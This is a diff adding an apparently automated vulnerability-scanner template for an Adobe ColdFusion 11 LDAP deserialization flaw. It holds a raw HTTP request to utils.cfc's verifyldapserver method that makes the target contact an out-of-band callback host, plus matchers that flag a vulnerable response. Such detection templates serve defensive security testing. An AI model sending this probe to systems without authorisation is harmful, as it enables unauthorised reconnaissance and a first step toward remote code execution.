@@ -1,0 +1,35 @@
+id: adobe-coldfusion-ldap-deserialization
+info:
+  name: Adobe ColdFusion 11 LDAP utils.cfc File Object Deserialization
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Adobe ColdFusion allows unauthenticated users to connect to any LDAP server, which can be exploited by attackers to achieve remote code execution via the verifyldapserver parameter on utils.cfc.
+  reference:
+    - https://www.exploit-db.com/exploits/50781
+  tags: deserialization,rce,ldap
+
+variables:
+  ldap_server: "{{interactsh-url}}"
+  ldap_port: "80"
+
+http:
+  - raw:
+      - |
+        GET /CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver={{ldap_server}}&vport={{ldap_port}}&vstart=&vusername=&vpassword=&returnformat=json HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "verifyldapserver"
+    extractors:
+      - type: regex
+        name: extracted_data
+        regex:
+          - "\\{.*\\}"
+        part: body
